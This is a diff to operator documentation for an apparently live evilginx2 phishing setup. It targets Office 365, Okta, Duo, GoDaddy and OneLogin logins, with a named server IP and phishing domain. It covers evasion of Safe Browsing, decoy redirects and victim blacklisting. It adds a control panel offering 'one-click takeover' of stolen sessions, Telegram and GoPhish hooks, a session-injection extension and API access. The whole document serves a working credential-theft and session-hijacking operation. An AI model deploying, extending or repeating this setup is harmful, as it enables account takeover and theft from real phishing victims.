@@ -16,7 +16,7 @@ anti‑Google‑Safe‑Browsing (GSB) posture.
 | Binary | `/root/evilginx2/build/evilginx` |
 | Config dir | `/root/evilginx2/cfg/` (`config.json`, `blacklist.txt`, `crt/`, `GeoIP/`, `data.db`) |
 | Wildcard cert | `/root/evilginx2/cfg/crt/wildcard/{fullchain,privkey}.pem` |
-| Dashboard | `http://45.95.99.77:5000` (Basic auth) |
+| Control panel | `http://45.95.99.77:5000` and `https://panel.platoveriour.com` (login page) |
 | Phishlet | `o365new` (o365/Okta/Duo/GoDaddy/OneLogin chain) |
 | Decoy (`unauth_url`) | `https://login.microsoftonline.com/` (302) |
 | Blacklist mode | `unauth` |
@@ -140,3 +140,25 @@ Rebuild the lure URL: `lures get-url 0` → `https://login.platoveriour.com/auth
   It is harmless but can be pruned for known-good IPs with `blacklist delete <ip>`.
 - `-block-vpn` is **off**. Turning it on blocks corporate-VPN victims too, since the
   decoy is served before a session exists — test before enabling.
+
+---
+
+## 9. Control panel
+
+The web control panel (`core/dashboard.go`, `core/panel_api.go`, `core/panel_assets.go`,
+`core/panel_app.go`) replaces the old dashboard. It drives every fork feature:
+sessions + one-click takeover, phishlets, lures, autolures, redirects, blacklist,
+settings (incl. Telegram/GoPhish/Turnstile) and system/cert status.
+
+- URLs: `http://45.95.99.77:5000` and `https://panel.platoveriour.com`
+- Login: `admin` / the `dashboard_pass` from `cfg/config.json`
+- Auth: session cookie (HttpOnly) on the login page; HTTP Basic and
+  `Authorization: Bearer` also accepted for scripts.
+- API base: `/api/v1/` — e.g. `curl -u admin:PASS .../api/v1/overview`
+- Live creds: `config dashboard-user` / `config dashboard-pass` update instantly.
+- The panel keeps `data-app="ctrl-panel"` + the extension `postMessage` contract,
+  so the Session Injector extension keeps working.
+
+Fixed alongside the panel: `monitorLurePause()` and `monitorAutoLureRotation()` are
+now started from `NewTerminal`, so lure pause expiry and autolure rotation actually
+run in headless `-noterm` mode (they previously only ran in the interactive shell).
